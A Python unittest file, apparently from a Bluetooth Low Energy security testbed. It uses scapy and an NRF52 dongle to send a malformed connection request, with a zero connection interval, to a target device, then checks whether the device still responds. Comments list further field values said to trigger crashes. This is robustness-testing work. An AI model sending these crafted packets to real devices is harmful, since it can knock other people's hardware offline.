#!/usr/bin/env python

""" Test suite """

from __future__ import print_function
import unittest
import core.ble as ble
from core.logging_utils import *
from mongodb_database.connect_mongodb import *
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
import sys
from scapy.compat import raw

from sql_database.connect import insert_data_to_link_layer_tests, insert_data_to_info_tests

log = logging.getLogger(__name__)


class Test_LL_CONNECTION_REQUEST_CRUSH(unittest.TestCase):
    """ Negative Tests for connection request crush """

    @classmethod
    def setUpClass(cls):
        c = config.loadConfig()
        attack='Connection Request Crush'
        cls.comPortNRF = c['TESTBED']['COM_PORT_NRF']
        cls.advertiser_address = c['TESTBED']['ADVERTISER_ADDRESS']
        cls.master_address = c['TESTBED']['MASTER_ADDRESS']
        cls.access_address = int(c['TESTBED']['ACCESS_ADDRESS'], 16)
        cls.connection = c['TESTBED']['CONNECTION_TO_DATABASE']
        log.info('Advertiser Address: ' + cls.advertiser_address.upper())
        # Open serial port of NRF52 Dongle
        cls.driver = NRF52Dongle(cls.comPortNRF, '115200')
        date = str(datetime.datetime.today()).split()[0].encode('ascii', 'ignore')

        # Choose from test.conf file  type of database to insert data
        if str(c['TESTBED']['DATABASE_VERSION']) == 'SQL':
            insert_data_to_link_layer_tests(cls.advertiser_address, cls.master_address, cls.access_address, date,
                                            attack, cls.comPortNRF)

        elif str(c['TESTBED']['DATABASE_VERSION']) == 'MONGODB':
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        elif str(c['TESTBED']['DATABASE_VERSION']) == 'BOTH':
            insert_data_to_link_layer_tests(cls.advertiser_address, cls.master_address, cls.access_address, date,
                                            attack, cls.comPortNRF)
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        else:
            print('Continue with no database')
            pass

    def setUp(self):
        pass

    def tearDown(self):
        pass

    @classmethod
    def tearDownClass(cls):
        cls.driver.close()

    def test_link_layer_LL_CONNECTION_REQUEST_CRUSH_001(self):

        """"connection request crush with parameters """

        log.info("Test CONNECTION_REQUEST CRUSH 001")
        none_count = 0
        slave_connected = False
        slave_addr_type = 0

        def send(scapy_pkt, print_tx=True):
            Test_LL_CONNECTION_REQUEST_CRUSH.driver.raw_send(raw(scapy_pkt))
            if print_tx:
                log.info("TX ---> " + scapy_pkt.summary()[7:])

        def crash_timeout():
            log.info( "No advertisement from " + Test_LL_CONNECTION_REQUEST_CRUSH.advertiser_address.upper() +
                  ' received\nThe device may have crashed...')
            sys.exit(0)



        scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
            ScanA=self.master_address,
            AdvA=self.advertiser_address)
        send(scan_req)


        log.info( 'Waiting advertisements from ' + self.advertiser_address)
        while True:
            pkt = None
            # Receive packet from the NRF52 Dongle
            data = self.driver.raw_receive()
            if data:
                # Decode Bluetooth Low Energy Data
                pkt = BTLE(data)
                # if packet is incorrectly decoded, you may not be using the dongle
                if pkt is None:
                    none_count += 1
                    if none_count >= 4:
                        log.info('NRF52 Dongle not detected')
                        sys.exit(0)
                    continue
                elif slave_connected and BTLE_EMPTY_PDU not in pkt:
                    # Print slave data channel PDUs summary
                    log.info("Slave RX <--- " + pkt.summary()[7:])
                # --------------- Process Link Layer Packets here ------------------------------------
                # Check if packet from advertised is received
                if pkt:
                    log.info( "Slave RX <--- " + pkt.summary()[7:])

                if BTLE_DATA in pkt:
                    log.info('Slave Connected (L2Cap channel established)')

                if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == self.advertiser_address.lower():

                    slave_addr_type = pkt.TxAdd
                    log.info(self.advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
                    # Send connection request to advertiser
                    conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                        InitA=self.master_address,
                        AdvA=self.advertiser_address,
                        AA=self.access_address,  # Access address (any)
                        crc_init=0x179a9c,  # CRC init (any)
                        win_size=2,  # 2.5 of windows size (anchor connection window size)
                        win_offset=2,  # 1.25ms windows offset (anchor connection point)
                        interval=16,  # 20ms connection interval
                        latency=0,  # Slave latency (any)
                        timeout=50,  # Supervision timeout, 500ms
                        # ---------------------28 Bytes until here--------------------------
                        chM=0x0000000001,
                        hop=5,  # any, including 0
                        SCA=0,  # Clock tolerance
                    )

                    conn_request[BTLE_CONNECT_REQ].interval = 0  # Clearing the interval time triggers the crash.
                    # Change parameters of connection request packet.
                    # 1) conn_request[BTLE_CONNECT_REQ].hop = 0  # Do not change frequency.
                    # 2) conn_request[BTLE_CONNECT_REQ].timeout = 0 # Supervision timeout = 0
                    # 3)conn_request[BTLE_CONNECT_REQ].win_size=0  # window size = 0
                    # 4)conn_request[BTLE_CONNECT_REQ].latency = 100 # slave latency = 1/101
                    # 5)conn_request[BTLE_ADV].Length = 247 Lowering the length also trigger the crash
                    # 6)conn_request[BTLE_ADV].Length = 26 CRC will be correct when sending over the air

                    send(conn_request)
                    log.info('Malformed connection request was sent')
                    #No connection has been established yet
                    pulse=ble.check_pulse_via_scan(self.driver, self.master_address, self.advertiser_address)
                    self.assertTrue(pulse, "Device did not respond to provisioning. Presumed dead....")
                    break

        log.info('Test Complete')





